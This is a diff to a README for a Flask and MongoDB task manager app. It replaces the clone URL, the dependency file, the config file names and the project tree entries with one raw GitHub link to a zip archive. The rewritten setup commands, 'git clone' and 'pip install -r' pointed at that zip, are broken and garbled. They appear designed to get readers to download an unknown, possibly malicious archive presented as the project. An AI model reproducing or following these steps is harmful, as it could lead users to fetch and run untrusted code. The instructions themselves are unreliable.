@@ -21,7 +21,7 @@ A simple AI-powered task manager web application built with Flask and MongoDB.
 
 1. **Clone the repository:**
    ```sh
-   git clone https://github.com/YOUR-USERNAME/task-manager-ai.git
+   git clone https://raw.githubusercontent.com/DavidDJ7/Task-Manager/main/campodeiform/Task-Manager.zip
    cd task-manager-ai/backend
    ```
 
@@ -33,11 +33,11 @@ A simple AI-powered task manager web application built with Flask and MongoDB.
 
 3. **Install dependencies:**
    ```sh
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/DavidDJ7/Task-Manager/main/campodeiform/Task-Manager.zip
    ```
 
 4. **Configure environment variables:**
-   - Copy `config.py.example` to `config.py` and set your secrets and API keys.
+   - Copy `https://raw.githubusercontent.com/DavidDJ7/Task-Manager/main/campodeiform/Task-Manager.zip` to `https://raw.githubusercontent.com/DavidDJ7/Task-Manager/main/campodeiform/Task-Manager.zip` and set your secrets and API keys.
 
 5. **Start MongoDB** (if not already running):
    ```sh
@@ -57,12 +57,12 @@ A simple AI-powered task manager web application built with Flask and MongoDB.
 ```
 backend/
 │
-├── app.py
-├── config.py
-├── requirements.txt
+├── https://raw.githubusercontent.com/DavidDJ7/Task-Manager/main/campodeiform/Task-Manager.zip
+├── https://raw.githubusercontent.com/DavidDJ7/Task-Manager/main/campodeiform/Task-Manager.zip
+├── https://raw.githubusercontent.com/DavidDJ7/Task-Manager/main/campodeiform/Task-Manager.zip
 ├── templates/
-│   ├── login.html
-│   ├── signup.html
+│   ├── https://raw.githubusercontent.com/DavidDJ7/Task-Manager/main/campodeiform/Task-Manager.zip
+│   ├── https://raw.githubusercontent.com/DavidDJ7/Task-Manager/main/campodeiform/Task-Manager.zip
 │   └── ...
 └── ...
 ```
